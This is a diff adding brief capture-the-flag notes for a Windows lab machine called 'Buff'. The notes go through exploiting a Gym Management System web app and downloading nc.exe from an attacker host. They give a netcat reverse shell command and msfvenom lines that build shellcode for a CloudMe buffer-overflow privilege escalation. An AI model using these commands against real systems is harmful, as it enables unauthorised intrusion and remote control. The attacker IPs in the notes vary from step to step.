@@ -1,0 +1,32 @@
+Buff is a Windows machine
+
+* The nmap scan show a web server running on port 8080 
+
+* Found out that the site is built using Gym Management System 
+  we can exploit it using https://www.exploit-db.com/exploits/48506
+
+* To upload nc.exe after connecting to the server set up a simple 
+http server with python and from the target machine do curl.exe -o nc.exe http://10.10.14.216:8001/nc.exe *
+
+* First upload nc.exe to the server and then use the exploit to 
+give the command nc.exe 10.10.14.104 7676 -e cmd.exe AFTER setting
+up a listener (For some reason uploading a php shell and connecting from
+the browser fails)*
+
+* For previledge excalation it has something to do with CloudMe which had a buffer overflow exploit *
+
+* Found the vulnerable version the box uses it is CloudMe version 1.1.2 and the exploit https://www.exploit-db.com/exploits/48389 *
+
+* We need to create a new payload so we use msfvenom *
+
+  msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.25 LPORT=7676 -b "\x00" -f py -o payload
+
+  Run the CloudMe_1112.exe on the Users/Shaun/Downloads folder
+  - ../../../../../Users/Shaun/Downloads/CloudMe_1112.exe
+
+  - netstat -aof | findstr :8888 => to see if port is listening
+
+  - msfvenom -a x86 -p windows/exec CMD="C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.25 7676 -e cmd.exe" -b '\x00\x0A\x0D' -f python
+
+
+taskkill /F /IM CloudMe_1112.exe
